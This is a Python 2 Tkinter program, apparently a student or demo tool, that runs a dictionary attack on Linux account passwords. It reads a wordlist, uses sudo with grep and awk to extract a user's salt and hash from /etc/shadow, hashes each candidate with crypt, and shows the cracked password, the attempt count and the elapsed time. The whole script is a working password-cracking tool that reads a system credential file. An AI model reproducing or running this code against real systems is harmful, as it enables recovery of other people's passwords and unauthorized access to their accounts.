import Tkinter
import tkMessageBox
import Image 
import ImageTk
import tkFont
import os
import sys
import commands
import crypt
import subprocess
import tkMessageBox
import time

from distutils.util import strtobool
from PIL import ImageTk,Image

fp = open('brute.txt') # open file on read mode
opcode = fp.read().split() # create a list containing all lines
fp.close()



top = Tkinter.Tk()
top.title('Brute-:force-:Attack')
top.geometry('1000x500')
top.configure(background='Teal',highlightthickness=7,highlightbackground="silver")
top.resizable(0,0)

frame3 = Tkinter.Frame(top,highlightthickness=5,highlightbackground="silver",bg='maroon')
frame3.pack(side = Tkinter.RIGHT,pady=20,padx=20)
def README():
 window = Tkinter.Toplevel(top)
 window.title('Read about Brute-force')
 p = subprocess.Popen("cat bruteforceattack.txt", stdout=subprocess.PIPE, shell=True)
 (output, err) = p.communicate()
 text = Tkinter.Text(window,height=20,width=80,font='Arial 8 bold')
 text.pack()
 text.insert(Tkinter.END, output)

def Brute():
 i=0 
 start_time = time.time()
 systemhash=commands.getoutput('sudo grep '+textbox.get("1.0","end-1c")+ ''' /etc/shadow | awk -F'$' '{print $4}' | awk -F: '{print $1}' ''')
 #tkMessageBox.showinfo("systemhash",systemhash)
 for word in opcode:
  i=i+1
  output=commands.getoutput('''sudo awk -F[:$] '$1==''' '"'+ textbox.get("1.0","end-1c")+ '"' '''{print "$" $3 "$" $4 "$"}' /etc/shadow''')   
  string=crypt.crypt(word, output)
  hash=string.replace(output,"")
  print hash
  print word
  if hash==systemhash:
   tkMessageBox.showinfo("number of attempt","number of attempt="+str(i))
   tkMessageBox.showinfo("Password","Password="+word)
   tkMessageBox.showinfo("--- %s seconds ---", "time taken in seconds="+str(time.time() - start_time ))
   break
  else: 
   print "false"

l1=Tkinter.Label(frame3,text="Enter Username:",fg='white',bg='maroon',font='Arial 12 bold')
textbox=Tkinter.Text(frame3,height=1.4,width=20,font='Arial 15 bold')
l1.pack(pady=20)
textbox.pack(pady=20,padx=20)
B = Tkinter.Button(frame3, text ="start Brute-force Attack",font='Arial 12 bold',command=Brute, height=2,width=18,padx = 20,fg='green')
B.pack(pady = 20, padx = 20)
B1 = Tkinter.Button(top, text ="README",font='Arial 10 bold',command=README, height=1,width=8,padx = 20,fg='green')
B1.pack(pady = 20, padx = 20)
img1 = ImageTk.PhotoImage(Image.open("logo1.png"))
panel1 = Tkinter.Label(top, image = img1,height=300,width=600,bg='Teal')
panel1.pack(side = Tkinter.LEFT)

top.mainloop()
